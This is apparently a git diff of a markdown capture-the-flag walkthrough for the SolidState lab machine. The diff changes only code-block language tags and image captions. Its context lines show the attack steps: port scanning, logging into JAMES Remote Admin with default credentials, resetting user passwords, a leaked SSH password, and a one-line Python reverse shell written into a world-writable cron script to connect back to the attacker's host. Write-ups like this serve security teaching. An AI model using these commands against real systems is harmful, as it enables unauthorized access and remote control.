@@ -8,7 +8,7 @@
 
 ### Openning Services
 
-``` bash
+``` txt
 ┌──(Hades㉿192.168.11.140)-[1.4:12.0]~/bash-script
 └─$ sudo ./auto_enum.sh 192.168.11.141
 
@@ -16,7 +16,7 @@ Scanning openning port ...
 [+] Openning ports: 22,25,80,110,119,4555
 ```
 
-``` bash
+``` txt
 ┌──(Hades㉿192.168.11.140)-[5.1:12.1]~/bash-script
 └─$ nmap -sC -sV 192.168.11.141 -p22,25,80,110,119,4555
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 06:41 EDT
@@ -45,11 +45,11 @@ Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
 
 ### Web Application
 
-![1](img/1.png)
+![](img/1.png)
 
 [+] Files and directories
 
-``` bash
+``` shell
 gobuster dir -k -u http://192.168.11.141:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                                         
 ===============================================================
 Gobuster v3.1.0
@@ -80,7 +80,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 [+] All URLs
 
-``` bash
+``` html
 <title>Home - Solid State Security</title>                                                                                                                                  
 <link rel="stylesheet" href="assets/css/main.css" />
 <!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
@@ -110,7 +110,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 SMTP
 
-``` bash
+``` txt
 nmap 192.168.11.141 -p25 --script=smtp-*
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 09:33 EDT
 Nmap scan report for 192.168.11.141
@@ -133,7 +133,7 @@ JAMES Remote Admin
 
 Using JAMES Service, I tried the default credentials of JAMES Remote Admin `root:root` and gained the access.
 
-``` bash
+``` txt
 ┌──(Hades㉿192.168.11.140)-[1.0:15.8]~
 └─$ nc -nv 192.168.11.141 4555
 (UNKNOWN) [192.168.11.141] 4555 (?) open
@@ -152,7 +152,7 @@ Welcome root. HELP for a list of commands
 
 In the JAMES Remote Admin, I changed all user's passwd to 123456.
 
-``` bash
+``` txt
 listusers
 
 Existing accounts 6
@@ -177,7 +177,7 @@ Revew mailbox and gather more information.
 
 === "script"
 
-	``` bash
+	``` txt
 	┌──(Hades㉿192.168.11.140)-[0.4:30.2]~/bash-script/mailbox
 	└─$ python mailbox.py 192.168.11.141
 	MailBox: james
@@ -458,7 +458,7 @@ At here, I had a ssh credential `mindy:P@55W0rd1!2@`
 ssh mindy@192.168.11.141
 ```
 
-![2](img/2.png)
+![](img/2.png)
 
 ## Privilege escalation
 
@@ -579,11 +579,11 @@ Exploit `linux/remote/35513.py` need a user login to the system to run the paylo
 	    print "Connection failed."
 	```
 
-![3](img/3.png)
+![](img/3.png)
 
 ### Using pspy to monitor process
 
-![4](img/4.png)
+![](img/4.png)
 
 All user can read, write, modify file `tmp.py`
 
@@ -599,8 +599,8 @@ Create reverse shell python and replace file `tmp.py`
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.140",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 ```
 
-![5](img/5.png)
+![](img/5.png)
 
 > I'M ROOT!
 
-![6](img/6.png)
+![](img/6.png)
